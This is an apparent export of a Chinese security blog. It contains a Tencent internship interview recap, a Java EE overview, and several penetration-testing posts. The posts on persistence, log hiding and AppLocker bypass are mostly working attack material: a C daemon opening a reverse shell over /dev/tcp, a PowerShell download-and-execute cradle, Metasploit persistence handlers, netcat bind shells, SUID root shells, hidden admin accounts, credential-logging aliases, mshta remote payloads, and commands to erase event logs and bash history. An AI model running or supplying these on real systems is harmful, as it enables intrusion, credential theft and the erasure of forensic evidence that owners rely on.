<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[腾讯实习安全岗面经]]></title>
    <url>%2F2019%2F03%2F13%2F%E8%85%BE%E8%AE%AF%E5%AE%9E%E4%B9%A0%E5%AE%89%E5%85%A8%E5%B2%97%E9%9D%A2%E7%BB%8F%2F</url>
    <content type="text"><![CDATA[前段时间投了份腾讯安全实习岗的职位，笔试感觉覆盖的范围比较广，包括了web，linux，c，ios，安卓，逆向等知识。当时答的时候感觉一直在被虐，当然也有一些比较简单的题目，当然放在多选里面（不选全不给分的多选就很方……）。后来诡使神差的给了面试的机会。一面二面的竟然都安排在了同一天，一面当天下午5点多，二面当天晚上九点多。不得不说腾讯的效率好高啊!下面就凭着自己的记忆，好好回忆下腾讯的笔试和面试题。 笔试选择题 比较多，忘了…… 填空题123451. linux 启动时需要从哪个文件夹读取文件系统2. python os库三种执行系统命令的方式3. 三题逆向都涉及汇编代码，不会......4. ssrf 提交post请求的方式5. 询问ip地址的mac地址协议是： 简答题1231. 获取了DMZ区域后的一台服务器，有哪几种搭建稳定的控制和数据流隧道来实现扩大利用战果的目的2. 现在的人工智能AI语音助手比较风靡，试从攻击面和防御机制两个方面探讨AIOT应用设备 一面整个一面的小哥哥人特别的随和，问的问题基本也是根据简历所写展开了问。基本就是提出一个点，让你去展开说，看知识面，然后他会选择性进一步问你某个技术细节，考验知识的深度。 为什么会走上安全这条路？ 说说你理解的安全是什么？ 你比较擅长于渗透，代码审计还是其他方向? 聊聊你理解的web安全，列举一下你知道的漏洞？ 我们来深入聊聊csrf和xss（回答了二者的原理，xss的类型，二者的区别，二者的防御手段） 你提到了DOM 型xss,那么你给我解释一下DOM型xss和和反射型xss的区别，dom型xss的防御手段除了你提到的CSP策略以外还有什么防御的手段？ sql注入的理解，种类，怎么防，预编译是个什么机制，为什么预编译可以基本上解决sql注入，预编译和服务器进行了几次交互？ 聊聊SSRF吧（原理，攻击利用方式，哪些防御措施） SSRF有哪些常见的绕过？DNS Rebinding怎么防？ XXE呢？有什么自己的看法和见解？ 我们来聊聊命令注入吧，聊聊你理解的命令注入，命令注入你怎么防？ 听说你渗透流程有一些理解，那么如果是你，你会选择攻击些什么东西，如果让你去攻击腾讯你会选择从哪些地方下手，说说你的思路吧？ 如果你拿到了你想要的东西，你怎么把东西给安全的传出去？然后呢？ 看你简历上你有写在一些网站发过一些文章和SRC发过一些漏洞，能够给我说说一些细节吗？比如写的文章是哪些方面的，都提交过哪些漏洞，说说自己找洞和提交的过程吧。 下面就是巴拉巴拉聊项目经历，特别问了腾讯前端代码混淆的那个项目是个啥？然后说说项目进展，你在项目中负责哪一块，在项目中有没有提出什么改进性的意见？然后说下你在项目中遇到的一些问题，就那你暗网那个项目来说一下吧，以及你是如何解决这些问题的？ 二面二面和一面埃得比较紧，而且没有短信提醒，直接一个电话打过来，自己当时还在回宿舍的路上。而且奔波了一天，头脑不是很灵光，感觉二面我整个人有点铁憨憨。然后就是整个二面的过程问的问题都是比较开放性的问题。 举一个你觉得特别能体现你能力的一个渗透场景说一下吧 对代码审计这一块有什么比较独特的见解吗？说说你是怎么做代码审计的吧？黑盒还是白盒审计做得多，都用过哪些审计工具？xxxx,xxxx，白盒审计的工具有使用过吗？ 你比较希望自己以后从事哪个方向？对这个方向有比较深入的理解吗？或者说你有什么相关的方法论吗？ waf有理解吗。说下你理解的waf机制，说说你在渗透测试的时候有尝试去绕过waf吗？ 说一说你理解的逻辑漏洞有哪些吗？ 我听说你对机器学习还有一些了解，你能说下你都知道哪些算法吗？你有实际使用过类似的算法做过什么项目吗？ 我还看到你说你对linux c有一些开发的基础，能够给我说说你做过哪些项目吗。 感觉你平时参加了比较多的项目活动和经历，会不会觉得自己弄得有点宽，不够精，你是如何安排自己的时间的？ 平时加入过哪些社团活动，有什么兴趣爱好吗？ 总结面试完腾讯以后，发现自己的确还是有很多东西需要去深入学习，一面感觉还好，但是二面就被这问题的阵势给吓住了，人生第一次面试经历献给了腾讯，还是很希望能够得到鹅肠的实习机会。不过不得不说，面试也暴露出了自己不少问题，很多问题后来思来想去应该会有更好的解答，临场发挥还是比较重要的。如果最后没过，可以积攒一波面试经历也未尝不是件好事。“革命尚未成功，同志仍需努力！”]]></content>
      <categories>
        <category>面经</category>
      </categories>
      <tags>
        <tag>应用运维安全岗</tag>
        <tag>腾讯实习</tag>
        <tag>面经</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java EE 序]]></title>
    <url>%2F2019%2F02%2F28%2FJava-EE-%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[踏上了安全这条“不归路”，越发觉得需要学习的东西还有很多。这个学期打算好好学习以下web框架。根据现实需求先从java框架开始，长路漫漫~ 在谈及java web开发，我们绕不过要来瞅瞅其发展历史。也就是在spring都还没出现的时候，java是怎么作为服务器端语言进行开发的。要理解这个问题，需要知道下面的一条时间线。 一幅图展示java的技术栈。 java一开始作为后端语言是基于Servlet，配合其他如Tomcat JBoss容器实例（也可以简单的理解为java版http服务器）实现的。一张图展示Servlet生命周期。 init()过程是在Tomcat这类容器启动时执行也可以是客户端初次访问时执行，取决于web服务器配置文件。init()过程主要负责把java文件编译成jar可提供service（）方法的可执行体。而destroy()则是销毁相应的servlet实体，发生在servlet发生改变或者web容器关闭。 后来发展出来了jsp，jsp可以做到Servlet的几乎所有功能，其内置的标签可以十分方便的实现后台开发，一定程度上看和ASP，PHP的形式相近。只不过JSP最终在服务端要转换成Servlet。其是基于Servlet发展起来的一种更方便开发的一门语言。 随后发展出来了前后端分离的MVC架构，更加贴近于服务端的Servlet又回来了，它作为纽带，链接Modle数据层和View视图层。这个时候的jsp因为其可以很好的结合html又能够和servlet构建桥梁，所以自然而然更多的被放在了视图层。伴随着MVC架构不断发展的是一堆组件，包括前端渲染引擎的出现，ORM概念的出现，成型的MVC框架的出现如spring mvc等，使得现在的基于java web开发不再是原生MVC架构，更多是采用线成的mvc框架取堆砌各个组件，极大的带来了开发的方便。而spring系列框架是一套成型的框架，历经历史的风霜，它不断完善至今，已经成为很多使用java 技术栈企业首选框架。 当然随着时代的发展，人们更多的追求页面渲染的性能。几乎与上面技术同步发展的同时出现了ajax异步轮循的技术实现非整页的局部渲染，可以在前端展示上带来性能的提升。为了适应前后端的AJAX通信，带火了一种数据格式json，因为其可以很无缝的被js操控，同时又具有类似对象的形式，方便机器解析的同时也方便人阅读。json逐渐称为前后端通信的主要数据格式。]]></content>
      <categories>
        <category>web框架</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>j2ee</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[权限维持杂谈]]></title>
    <url>%2F2019%2F02%2F26%2F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%9D%82%E8%B0%88%2F</url>
    <content type="text"><![CDATA[这是一篇介绍渗透测试后阶段权限维持的文章，里面包括了当今服务器的两大主流操作系统linux和windows的相关维权技术。所有维权手段中，最为通用的莫过于计划任务，所以本篇有较大篇幅科普了windows和linux的计划任务。技术也不是最新的，本着学习思路把前辈的方法做个摘录。 0x01 MSFpersistence msf内置的后渗透权限维持工具persistence，参考[3]盗得一图 Metsvc它是通过在已经获得shell的目标主机上开启了一个服务来提供后门的功能。run Metsvc -h Scheduleme &amp; Schtasksabusemsf中自动利用计划任务的后门程序，后面会聊到linux和windows平台的计划任务。1234567run scheduleme -h# 例子：上传nc并创建计划任务每一分钟执行一次 &apos;nc -e cmd.exe -L -p 8080&apos;run scheduleme -m 1 -e /tmp/nc.exe -o &quot;-e cmd.exe -L -p 8080&quot; run Schtasksabuse -h# 例子：每隔4秒执行一次calc.exe run schtasksabuse -t 192.168.2.7 -c &quot;cmd /c calc.exe&quot; -d 4 Mof_ps_persist 现在已经找不到这个利用模块，参考：https://github.com/khr0x40sh/metasploit-modules/blob/master/persistence/mof_ps_persist.rb Autorunscript获取shell的时候自动执行持续化脚本,可以被Autorunscript执行的命令目录在metasploit/scripts/meterpreter1234567891011121314151617# persistenceuse exploit/multi/handlerset PAYLOAD windows/meterpreter/reverse_tcpset LHOST 192.168.2.101set LPORT 5555set ExitOnSession falseset AutoRunScript persistence -r 192.168.2.101 -p 5556 -U -X -i 30exploit# metsvcuse exploit/multi/handlerset PAYLOAD windows/meterpreter/reverse_tcpset LHOST 192.168.2.101set LPORT 5555set ExitOnSession falseset AutoRunScript metsvc -Aexploit 0x02 计划任务无论是windows还是linux操作系统都提供计划任务功能，来实现定时或者周期性的执行一些指令。自然而然我们可以在计划任务中做手脚，埋后门。 windows 图形化工具：taskschd.msc 命令行工具：schtasks.exe1234567891011121314151617181920212223242526272829303132333435SCHTASKS /parameter [arguments]描述: 允许管理员创建、删除、查询、更改、运行和中止本地或远程系统上的计划任 务。参数列表: /Create 创建新计划任务。 /Delete 删除计划任务。 /Query 显示所有计划任务。 /Change 更改计划任务属性。 /Run 按需运行计划任务。 /End 中止当前正在运行的计划任务。 /ShowSid 显示与计划的任务名称相应的安全标识符。 /? 显示此帮助消息。Examples: SCHTASKS SCHTASKS /? SCHTASKS /Run /? SCHTASKS /End /? SCHTASKS /Create /? SCHTASKS /Delete /? SCHTASKS /Query /? SCHTASKS /Change /? SCHTASKS /ShowSid /?Payload examples: SCHTASKS /Create /TN update /TR xx(待执行的命令) /DELAY ONLOGON /F /RL HIGHEST linux 一次性执行任务：at命令———&gt;atd进程 周期性执行任务：crontab命令———&gt;crond进程 在实际的渗透过程中我们更倾向于使用crontab at123456789101112131415161718192021- 1.服务开启service atd start- 2.基本格式at [HH:MM] [yyyy-mm-dd] #没有指定年月日的，默认是当天的。- 3.查询当前设置的at任务列表atq #或at -l- 4.删除指定任务编号的at任务atrm 编号 #或at -d- 5.查看计划任务的具体内容at -c 任务号- 6.使用文件中的命令作为计划任务（比较少用）at 时间 -f 文件- 7.相关文件/etc/at.deny：#该名单里面的人不可以使用/etc/at.allow：#只有该名单里面的人可以使用 crontab 注意：（1）crontab 只会在/sbin、/bin、/usr/sbin、/usr/bin下查找命令，如果命令不在这些目录中，应该要使用绝对路径。（2）只有root用户可以管理其他用户的周期性任务（3）crontab在重启后之前的周期性任务无效，anacron可以弥补crontab的缺陷。配置文件：/etc/anacrontab。anacrontab会开机自动检查没有执行的计划任务，然乎逐一执行，这个过程是用户透明的。一般而言，crontab就已经可以满足基本的需求。 12345678910111213141516- 1.服务开启 service crond start- 2.编辑计划任务crontab -e -u 用户名- 3.查看计划任务crontab -l -u 用户名- 4.删除计划任务：crontab -r -u 用户名- 相关文件/var/spool/cron/用户名 #用户定义的设置/var/log/cron #cron服务的日志文件/etc/crontab #cron服务配置文件： anacronanacron是一个不同于crontab的任务，其只精确到天，用来弥补服务器在宕机下crond调度不周以及缓解计划任务执行过于集中的问题。它需要记录上次执行的时间，并更新到相应的/var/spool/anacron目录下，下次执行的时候会将当前时间和上次记录的时间进行对比，如果满足大于/etc/anacron的配置的天数就会立即执行相应的命令，然后刷新时间。1234567891011121314anacron 命令行参数：-t 配置文件路径让anacron从指定配置文件中读取配置，常用于普通用户来管理个人任务-S spooldir设定新的spool目录来记录任务执行的时间戳，常用于普通用户来管理个人任务-T测试配置文件是否正确-f强制执行所有的任务，而不管之前的执行日期是否超过轮回天数-u将所有任务的执行日期都更新为当前日期，而不真正的执行任务-s串行地执行任务，只有前一个任务完成后才开始下一个任务 0x03 windows权限维持影子账户创建一个无法用用户本机用户罗列工具显示的用户，并且赋予管理员权限。所有操作需要有管理员权限。同时测试在windows server 2012服务器域环境下影子账户无法直接进行添加。 用’$’创建匿名用户，并归到administratorsa用户组 12net user admin$ Test1 /addnet localgroup administrators admin$ /add 导出匿名用户对应的sam目录下的注册表键值 1regedt32.exe 打开 HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users键值，导出Names下用户目录以及对应的16进制目录。注意需要给Administrator用户赋予Sam键值权限，默认是不允许的。 删除匿名用户，双击导出的注册表文件，用先前导出的注册表键值对注册表进行修改。则可以重新还原之前的匿名用户，但是除了在注册表里面有用户记录，其他地方都不存在用户的信息。net user或计算机管理里本地用户和用户组是看不到用户信息的，具有很好的隐蔽性质。1net user admin$ /del PowerShell后门Empire框架 https://github.com/EmpireProject/Empire Schtasks-Backdoor https://github.com/re4lity/Schtasks-Backdoor msf1234use exploit/multi/script/web_delivery- 设置好参数后的powershell例子：powershell.exe -ExecutionPolicy Bypass -nop -w hidden -c $V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $V.downloadstring(&apos;http://192.168.80.155:8888/&apos;); 注册表开机启动在如下的注册表目录下注入键值HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run，可以实现开机自启动。以windows defender为例: 映像劫持 细节参考：https://www.anquanke.com/post/id/151425 涉及到的注册表项为IFEO（Image File Execution Options），默认是只有管理员和local system有权读写修改。1“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options” 大致的原理如下：当我们按照常理运行属于IFEO列表的文件的时候（即可执行文件名在上述的注册表项下，出于简化原因，IFEO使用忽略路径的方式来匹配它所要控制的程序文件名，所以程序无论放在哪个路径，只要名字没有变化，它就可以正常运行。）会执行相关的选项参数，这里我们主要利用的参数是debugger,通过该参数我们可以实现偷梁换柱。下面以修改IE启动程序为例，实现运行IE程序但是启动的却是计算器。123451. 找到注册表“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options”目录下的iexplore.exe2. 添加一个debugger字符串键值，并且赋值为calc.exe的执行路径，“C:\Windows\system32\calc.exe”3. 运行 iexplore.exe,bomb!!! 当然我们也可以在第一步新键一个注册表文件目录，取名为想要覆盖的可执行程序，后续步骤类似。 但是这样明目张胆的偷梁换柱有点张扬，根据安全客那篇文章，修改另外两个注册表键值可以实现原程序退出后静默运行后门程序。以执行notepad为例，退出后静默运行calc.exe 12345reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; /v GlobalFlag /t REG_DWORD /d 512reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v ReportingMode /t REG_DWORD /d 1reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v MonitorProcess /t REG_SZ /d &quot;C:\Windows\system32\calc.exe&quot; shift后门这个后门的方式比较老，在windows登陆的时候按五次shift打开cmd进行操作。前提条件是:在将C盘windows目录下面的system32文件夹可写的情况下，将里面的sethc.exe应用程序进行转移，并生成sethc.exe.bak文件。并将cmd.exe拷贝覆盖sethc.exe。 但是在windows xp过后，sethc组件属于完全受信用的用户TrustInstall，我们无法修改名字，这时候即使administrators都只有名义上的只读和可执行权，我们可以手动修改其所属为administrators，步骤如下：12345右键属性/安全/高级；所有者/编辑/添加当前用户/应用/确定；关闭窗口；右键属性/安全/编辑；选择Administrators（或者你的当前组）/勾选完全控制/确定； 0x04 linux权限维持可以看到windows的权限维持很多时候是基于注册表值，但是linux里面没有注册表项，但是有很多的配置文件选项，可以达到相似的功能。下面介绍一些比较实用的后门手段。 sshd软连接 原理细节： http://www.91ri.org/16803.html 12345victimln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555;attackssh root@x.x.x.x -p 5555 SUID Shellroot 权限下执行如下命令，普通用户运行/dev/.rootshell即可获得root权限12cp /bin/bash /dev/.rootshellchmod u+s /dev/.rootshell alias瞒天过海我们可以通过alias来指定执行特定的命令时候静默运行其他程序，从而达到启动后门，记录键值等作用。下面举两个实例： 修改ssh命令，利用strace，使其具有记录ssh对read,write,connect调用的功能。 1alias ssh=&apos;strace -o /tmp/sshpwd-`date &apos;+%d%h%m%s&apos;`.log -e read,write,connect -s2048 ssh&apos; 利用守护进程回弹shell 1alias cat=&apos;cat&amp;&amp;/root/.shell&apos; shell.c12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;sys/stat.h&gt;#include &lt;signal.h&gt;#define ERR_EXIT(m) \do\&#123;\ perror(m);\ exit(EXIT_FAILURE);\&#125;\while (0);\void creat_daemon(void);int main(void)&#123; time_t t; int fd; creat_daemon(); system(&quot;bash -i &gt;&amp; /dev/tcp/192.168.80.167/8080 0&gt;&amp;1&quot;); return 0;&#125;void creat_daemon(void)&#123; pid_t pid; int devnullfd,fd,fdtablesize; umask(0); pid = fork(); if( pid == -1) ERR_EXIT(&quot;fork error&quot;); if(pid &gt; 0 ) exit(EXIT_SUCCESS); if(setsid() == -1) ERR_EXIT(&quot;SETSID ERROR&quot;); chdir(&quot;/&quot;); /* close any open file descriptors */ for(fd = 0, fdtablesize = getdtablesize(); fd &lt; fdtablesize; fd++) close(fd); devnullfd = open(&quot;/dev/null&quot;, 0); /* make STDIN ,STDOUT and STDERR point to /dev/null */ if (devnullfd == -1) &#123; ERR_EXIT(&quot;can&apos;t open /dev/null&quot;); &#125; if (dup2(devnullfd, STDIN_FILENO) == -1) &#123; ERR_EXIT(&quot;can&apos;t dup2 /dev/null to STDIN_FILENO&quot;); &#125; if (dup2(devnullfd, STDOUT_FILENO) == -1) &#123; ERR_EXIT(&quot;can&apos;t dup2 /dev/null to STDOUT_FILENO&quot;); &#125; if (dup2(devnullfd, STDERR_FILENO) == -1) &#123; ERR_EXIT(&quot;can&apos;t dup2 /dev/null to STDOUT_FILENO&quot;); &#125; signal(SIGCHLD,SIG_IGN); return;&#125; linux PAM密码记录后门pam是一种认证机制，它可帮助管理员快速方便地配置认证方式，并且无需更改服务程序。这种后门主要是通过pam_unix_auth.c打补丁的方式潜入到正常的pam模块中，以此来记录管理员的帐号密码。 https://blog.51cto.com/redkey/1343316 PROMPT_COMMAND后门bash提供了一个环境变量PROMPT_COMMAND,这个变量会在你执行命令前执行一遍。1export PROMPT_COMMAND=&quot;lsof -i:1025 &amp;&gt;/dev/null || (python -c &quot;exec(&apos;encoded_payload&apos;.decode(&apos;base64&apos;))&quot; 2&gt;/dev/null &amp;)&quot; 当然也可以使用prompt_command进行提权,参考：https://www.anquanke.com/post/id/155943 ssh免密后门把id_rsa.pub写入服务端的/home/[用户名]/.ssh/authorized_keys中。 rootkitrootit的后门相对比较顽固，有应用级别和系统级别的rootkit，其大致的思路是hook进常规的调用中，是比较硬核的，经常体现在APT攻击中。下面是一个菊苣收集的rootkit后门的链接。具体的细节因为不同的rootkit具体实现不一致，笔者才疏，无法完全弄清楚，仅给出链接，方便日后学习。 列表：https://github.com/d30sa1/RootKits-List-Download 参考文献[1]https://www.anquanke.com/post/id/155943[2]http://view.inews.qq.com/a/20180820B0WO1Z00[3]https://phyb0x.github.io/2018/12/21/win%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/[4]http://xnianq.cn/2018/07/23/windows%E5%90%8E%E9%97%A8%E7%A7%8D%E6%A4%8D%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/[5]https://www.anquanke.com/post/id/99793[6]https://www.secfree.com/a/1049.html[7]http://hebic.me/2018/11/02/Linux-rootkit-%E5%88%9D%E6%8E%A2/]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>权限维持</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[日志隐匿]]></title>
    <url>%2F2019%2F02%2F16%2F%E6%97%A5%E5%BF%97%E9%9A%90%E5%8C%BF%2F</url>
    <content type="text"><![CDATA[本篇文章主要记录在内网渗透过程中日志清理技术。一个真正成功的渗透测试是一个达到目后实现全身而退。要想做到全身而退，那么适宜的日志清理技术是一个十分关键的步骤。 windows通过微软图形化工具，可以看到windows的日志系统大致分为以下五种：12345应用程序安全Setup系统Forwarded events 常见的windows应用日志保存位置 由于不同的windows发行版具体位置可能有些许不一致，可以通过注册表查看具体的日志存位置：HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Services/Eventlog 下面为windows Server 2012 和windows 10 的日志位置12345678- system%SystemRoot%\system32\winevt\Logs\System.evtx- Security%SystemRoot%\System32\winevt\Logs\Security.evtx- HardwareEvents%systemroot%\system32\winevt\logs\HardwareEvents.evtx- Application%SystemRoot%\system32\winevt\Logs\Application.evtx 常用的日志操作命令 https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc732848(v=ws.11) 1234567891011121314151617- 默认视图格式（xml）查看最近的10条 security 记录,可以通过查看xml格式获得日志对应的EventRecordIDwevtutil.exe qe Security /rd:true /c:10- 以txt视图格式查看最近的10条application记录wevtutil.exe qe Application /rd:true /c:10 /f:txt- 导出Security所有日志并保存为1.evtxwevtutil.exe epl Security 1.evtx- 删除Security下的单条日志(EventRecordID=1112)，并保存为1.evtxwevtutil epl Security 1.evtx &quot;/q:*[System [(EventRecordID!=1112)]]&quot;- 删除Security下的多条日志(EventRecordID为13030、13031和13032)，结果保存为1.evtxwevtutil epl Security 1.evtx &quot;/q:*[System [(EventRecordID&gt;13032) or (EventRecordID&lt;13030)]]&quot;- 删除SystemTime为2018-08-10T03:20:00至2018-08-10T03:21:00之间的日志，结果保存为1.evtxwevtutil epl Security 1.evtx &quot;/q:*[System [TimeCreated[@SystemTime &gt;&apos;2018-08-10T03:21:00&apos; or @SystemTime &lt;&apos;2018-08-10T03:20:00&apos;]]]&quot; windows日志隐匿 windows后渗透日志相关现成的工具[1]clearlog(http://ntsecurity.nu/toolbox/clearlogs/)[2]phant0m(https://artofpwn.com/phant0m-killing-windows-event-log.html)[3]Elsave(http://www.ibt.ku.dk/jesper/elsave/) 删除指定日志在Windows日志中记录了很多操作事件，为了方便用户对它们的管理，每种类型的事件都赋予了一个惟一的编号，这就是事件ID。一个完美的攻击流程是不再目标系统上留下攻击者的任何蛛丝马迹。这就要求我们对日志有选择的删除，制造不曾来过的假象。然而在windwos10系统上做到非全盘删除日志有一定的技术难度。大致流程如下： 具体可以参考三号学生前辈的系列文章：https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4/121. 有选择的将日志文件导出（过滤掉hacker操作后的日志）2. 将导出的日志文件对原日志文件进行替换操作。 阻止进程产生日志windows日志服务的对应的宿主进程为 Services.exe，大致的实现思路如下：12345671、定位eventlog服务对应进程svchost.exe的pid2、遍历该进程中的所有线程3、判断线程是否满足条件4. 调用API终止满足条件的线程 上述工具[2]就是实现了上述的流程的自动化工具。更多的细节可以点进工具主页。 组织实时日志记录在大型的企业架构上，相关组件的日志是实时采集并集中处理的，如ELK，上述的windows日志隐匿操作知识在这里就比较局限。在这个时候做到行踪隐匿比较费劲。大致有两种思路，其一是完全拿下日志集中处理的服务器，这样就可以为所欲为。其二，找到客户机的日志agent，通过进程注入hook,忽略修改日志报备的细节。可以说实时日志记录的大型架构下的渗透要做到无痕的难度大了许多。笔者对这类大型架构的接触很少，没有相关的实战操作，所以这部分只能待日后阅历上来后，继续完善。 Linuxwindows和linux的日志机制有较大的区别。linux下的日志目录比较规范12删除/var/log下的文件即可: rm -f -r /var/log linux常用日志介绍12345678910111213141516171819202122232425262728293031- 对于明文的Apache文件，通过正则表达式就可以搞定：sed –i &apos;s/192.168.1.3/192.168.1.4/g&apos; /var/log/apache/ access.logsed –i &apos;s/192.168.1.3/192.168.1.4/g&apos; /var/log/apache/error_log其中192.168.1.3是我们的IP，192.168.1.4使我们伪造的IP。MySQL日志文件log-error=/var/log/mysql/mysql_error.log #错误日志log=/var/log/mysql/mysql.log#最好注释掉，会产生大量的日志，包括每一个执行的sql及环境变量的改变等等log-bin=/var/log/mysql/mysql_bin.log # 用于备份恢复，或主从复制.这里不涉及。log-slow-queries=/var/log/mysql/mysql_slow.log #慢查询日志log-error=/var/log/mysql/mysqld.logpid-file=/var/run/mysqld/mysqld.pidsed –i &apos;s/192.168.1.3/192.168.1.4/g&apos;/var/log/mysql/mysql_slow.log至于二进制日志文件，需要登录mysql client来修改删除，建议这种操作最先执行。php日志修改sed –i &apos;s/192.168.1.3/192.168.1.4/g&apos;/var/log/apache/php_error.log最后就是Linux的日志文件了，这个比较多，记录的也比较复杂，我的环境是CentOS 6.3。我现在只把和渗透有关的文件列出来，主要在/etc/logrotate.d/syslog中/var/log/maillog，该日志文件记录了每一个发送到系统或从系统发出的电子邮件的活动，它可以用来查看用户使用哪个系统发送工具或把数据发送到哪个系统var/log/messages，该文件的格式是每一行包含日期、主机名、程序名，后面是包含PID或内核标识的方括号，一个冒号和一个空格/var/log/wtmp，该日志文件永久记录每个用户登录、注销及系统的启动，停机的事件。该日志文件可以用来查看用户的登录记录，last命令就通过访问这个文件获得这些信息，并以反序从后向前显示用户的登录记录，last也能根据用户，终端tty或时间显示相应的记录/var/run/utmp，该日志文件记录有关当前登录的每个用户的信息，因此这个文件会随着用户登录和注销系统而不断变化，它只保留当时联机的用户记录，不会为用户保留永久的记录。系统中需要查询当前用户状态的程序，如who、w、users、finger等就需要访问这个文件/var/log/xferlog，该日志文件记录FTP会话，可以显示出用户向FTP服务器或从服务器拷贝了什么文件。该文件会显示用户拷贝到服务器上的用来入侵服务器的恶意程序，以及该用户拷贝了哪些文件供他使用。 linux下有bash的历史命令记录，这点不要忘记1234567- 修改history保存历史命令个数export HISTSIZE=0- 使用0覆盖history历史文件shred -zu /root/.bash_history- 修改history命令历史记录保存文件为空文件export HISTFILE=/dev/null 参考[1]https://artofpwn.com/phant0m-killing-windows-event-log.html[2]https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4/[3]https://threathunter.org/topic/593eb1bbb33ad233198afcfa[4]http://www.4hou.com/penetration/5998.html]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>后渗透</tag>
        <tag>日志</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[域渗透（二）]]></title>
    <url>%2F2019%2F02%2F14%2F%E5%9F%9F%E6%B8%97%E9%80%8F%EF%BC%88%E4%BA%8C%EF%BC%89%2F</url>
    <content type="text"><![CDATA[前一篇关于域渗透的文章主要介绍了域渗透过程中的权限的横向移动策略，主要原理是依赖windows的认证机制，在域环境下主要是DA的域密码文件hash的导出,彩虹表明文破解和内存明文密码抓取，或者使用kerberos用户的hash伪造黄金票据进行域扩散等。这篇文章主要是想说明下Windows AppLocker的绕过。文章是在看了乌云大会2016年的议题：Shell is Only the Beginning后，对议题相关知识细节进行学习的记录。 0x01 概述所谓的Windows AppLocker绕过，指的是“应用程序控制策略”Bypass。在windwos7和windows server 2008 后开始启用。可以简单的理解为对应用程序加了一层防火墙，通过指定执行策略指定了哪些应用可以被执行。包括可执行的程序路径，可执行的程序类型，指定可执行相应程序的用户组等。在AppLocker开启的情况下，默认的策略如下：1231. 允许本地管理员组的成员运行所有应用程序。2. 允许 Everyone 组的成员运行位于 Windows 文件夹中的应用程序。3. 允许 Everyone 组的成员运行位于 Program Files 文件夹中的应用程序。 在支持Windows AppLocker 的windows版本中，我们可以通过打开本地安全策略进行操作。[Win]+R输入`secpol.msc``打开本地安全策略。 由于Windows AppLocker的存在，在渗透的时候我们有时就需要对这些策略进行绕过。本文就是介绍各种绕过思路。 0x02 HTA（HTML Application）HTA的实现是一种设计理念。直接将HTML保存成HTA的格式，就是一个独立的应用软件。这样html的运行就可以脱离浏览器成为一个独立的软件运行(所以拥有读写文件、操作注册表等权限)。由于可以把.hta后缀文件单独运行，而HTA本身可执行性是在Windows AppLocker默认策略白名单之内的，这样我们可以得到一种绕过Windows AppLoacker白名单的方式: mshta.exe payload.tha 利用方式1：直接写入文件，html调用VBscript搞事情12345678910111213# 有弹窗&lt;script LANGUAGE=&quot;VBScript&quot;&gt;Set cmd = CreateObject(&quot;WScript.Shell&quot;) cmd.run(&quot;ping 1.1.1.1&quot;)&lt;/script&gt;# 无弹窗&lt;SCRIPT LANGUAGE=&quot;VBScript&quot;&gt;set a = CreateObject(&quot;WScript.Shell&quot;)visible = falsea.run &quot;mshta.exe &quot;&quot;file:///evil.hta&quot;&quot;&quot;, visiblewindow.close()&lt;/SCRIPT&gt; 利用方式2：无文件攻击，内存代码执行1234567mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://webserver/payload.sct&quot;&quot;)&quot;))mshta http://webserver/payload.htamshta javascript:alert(&apos;hello&apos;);window.close();Mshta.exe vbscript:CreateObject(&quot;Wscript.Shell&quot;).Run(&quot;calc.exe&quot;,0,true)(window.close) 利用方式3：结合CVE-2017-11882,word文档执行HTA https://github.com/Ridter/CVE-2017-11882/ 0x03 Rundll32 细节参考： https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32 Rundll32是微软的一个原生程序用以传入参数的方式来显式的调用动态库中的函数。同时Rundll32是默认白名单的，可以作为绕过AppLocker的一种手段。根据这一特性，我们可以编写pac.dll，利用Rundll32实现代码执行。根据官方的文档手册，我们可以得出Rundll32程序的命令行使用：1234The command line for Rundll is as follows: RUNDLL.EXE &lt;dllname&gt;,&lt;entrypoint&gt; &lt;optional arguments&gt;An example is as follows: RUNDLL.EXE SETUPX.DLL,InstallHinfSection 132 